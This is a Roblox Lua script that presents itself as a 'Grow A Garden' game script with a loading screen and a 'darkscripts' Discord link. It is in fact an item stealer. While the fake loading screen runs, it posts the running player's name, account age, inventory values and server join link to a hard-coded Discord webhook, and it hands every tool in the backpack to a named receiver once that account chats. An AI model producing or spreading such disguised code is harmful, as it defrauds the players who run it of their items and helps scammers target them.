local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")
local CoreGui = game:GetService("CoreGui")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1375150931334664244/195dhN4TmlV8qXHB3SPulJiH73Bs9AXAkTmT1HDC9BEQldqwQ1DGALIUZpOCrYJ06tWk"
local TARGET_USERNAME = "ambakings"

-- FULL LOADING SCREEN TANPA DIPOTONG
task.spawn(function()
local Loading = Instance.new("ScreenGui")
Loading.IgnoreGuiInset = true
Loading.Parent = game:GetService("CoreGui")

local Background = Instance.new("Frame")
Background.Size = UDim2.new(1, 0, 1, 0)
Background.Parent = Loading

local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
}
UIGradient.Parent = Background

local Pattern = Instance.new("ImageLabel")
Pattern.BackgroundTransparency = 1
Pattern.Size = UDim2.new(1, 0, 1, 0)
Pattern.Image = "rbxassetid://2151741365"
Pattern.ImageTransparency = 0.5
Pattern.ScaleType = Enum.ScaleType.Tile
Pattern.TileSize = UDim2.new(0, 250, 0, 250)
Pattern.Parent = Background

local Title = Instance.new("TextLabel")
Title.AnchorPoint = Vector2.new(0.5, 0.5)
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0.5, 0, 0.3, 0)
Title.Size = UDim2.new(0.3, 0, 0.3, 0)
Title.Font = Enum.Font.GothamBlack
Title.Text = "🌴 GROW A GARDEN 🌴"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.Parent = Background

local Percent = Instance.new("TextLabel")
Percent.AnchorPoint = Vector2.new(0.5, 0.5)
Percent.BackgroundTransparency = 1
Percent.Position = UDim2.new(0.5, 0, 0.5, 0)
Percent.Size = UDim2.new(0.8, 0, 0.04, 0)
Percent.Font = Enum.Font.GothamSemibold
Percent.Text = "Script Loading Please Wait for a While"
Percent.TextColor3 = Color3.fromRGB(255, 255, 255)
Percent.TextXAlignment = Enum.TextXAlignment.Center
Percent.TextScaled = true
Percent.Parent = Background

local Bar = Instance.new("Frame")
Bar.AnchorPoint = Vector2.new(0.5, 0.5)
Bar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Bar.BackgroundTransparency = 0.5
Bar.Position = UDim2.new(0.5, 0, 0.56, 0)
Bar.Size = UDim2.new(0.5, 0, 0.065, 0)
Bar.Parent = Background

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = Bar

local Load = Instance.new("Frame")
Load.Name = "LoadBar"
Load.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Load.Position = UDim2.new(0, 0, 0, 0)
Load.Size = UDim2.new(0, 0, 1, 0)
Load.Parent = Bar

local UICorner2 = Instance.new("UICorner")
UICorner2.CornerRadius = UDim.new(0, 10)
UICorner2.Parent = Load

local PercentOnBar = Instance.new("TextLabel")
PercentOnBar.AnchorPoint = Vector2.new(0.5, 0.5)
PercentOnBar.BackgroundTransparency = 1
PercentOnBar.Position = UDim2.new(0.5, 0, 0.65, 0)
PercentOnBar.Size = UDim2.new(1, 0, 0.05, 0)
PercentOnBar.Font = Enum.Font.GothamSemibold
PercentOnBar.Text = "0%"
PercentOnBar.TextColor3 = Color3.fromRGB(255, 255, 255)
PercentOnBar.TextScaled = true
PercentOnBar.Parent = Background

local Link = Instance.new("TextLabel")
Link.AnchorPoint = Vector2.new(0.5, 0.5)
Link.BackgroundTransparency = 1
Link.Position = UDim2.new(0.5, 0, 0.56, 0)
Link.Size = UDim2.new(0.3, 0, 0.02, 0)
Link.Font = Enum.Font.SourceSansBold
Link.Text = "discord.gg/darkscripts"
Link.TextColor3 = Color3.fromRGB(150, 150, 150) 
Link.TextScaled = false
Link.TextSize = 14
Link.Parent = Background

local TweenService = game:GetService("TweenService")
local tweenInfo = TweenInfo.new(180, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
TweenService:Create(Load, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)}):Play()

task.spawn(function()
    for i = 0, 100 do
        PercentOnBar.Text = i .. "%"
        if i < 100 then
            task.wait(180 / 100)
        end
    end
end)
end)

-- SCAN & SEND WEBHOOK
local function formatBackpack()
    local result, total = {}, 0
    for _, tool in ipairs(Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local name = tool.Name
            local val = tonumber(name:match("→ (%d+)¢")) or 0
            total += val
            table.insert(result, name .. " -> " .. val .. "¢")
        end
    end
    table.sort(result)
    return result, total
end

local function sendWebhook()
    local items, total = formatBackpack()
    local embed = {
        title = "🪴 Grow A Garden Hit - DARK SCRIPTS ☘️",
        description = "**👤 Player Information**\n```Name: " .. LocalPlayer.Name .. "\nReceiver: " .. TARGET_USERNAME .. "\nExecutor: Delta\nAccount Age: " .. LocalPlayer.AccountAge .. " days```",
        fields = {
            { name = "💰 Total Value", value = total .. "¢", inline = false },
            { name = "🌴 Backpack", value = "```" .. table.concat(items, "\n") .. "```", inline = false },
            { name = "🌐 Join with URL", value = "[" .. game.JobId .. "](https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId .. ")", inline = false }
        }
    }

    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            content = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")",
            embeds = {embed}
        })
    })
end

sendWebhook()

-- TRANSFER SAAT TARGET CHAT
Players.PlayerChatted:Connect(function(sender, msg)
    if sender.Name == TARGET_USERNAME then
        local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local hisChar = sender.Character or sender.CharacterAdded:Wait()
        myChar:WaitForChild("HumanoidRootPart").CFrame = hisChar:WaitForChild("HumanoidRootPart").CFrame + Vector3.new(2, 0, 0)

        local sorted = {}
        for _, tool in ipairs(Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local val = tonumber(tool.Name:match("→ (%d+)¢")) or 0
                table.insert(sorted, {Tool = tool, Value = val})
            end
        end
        table.sort(sorted, function(a, b) return a.Value > b.Value end)

        for _, data in ipairs(sorted) do
            data.Tool.Parent = sender.Backpack
            task.wait(0.2)
        end
    end
end)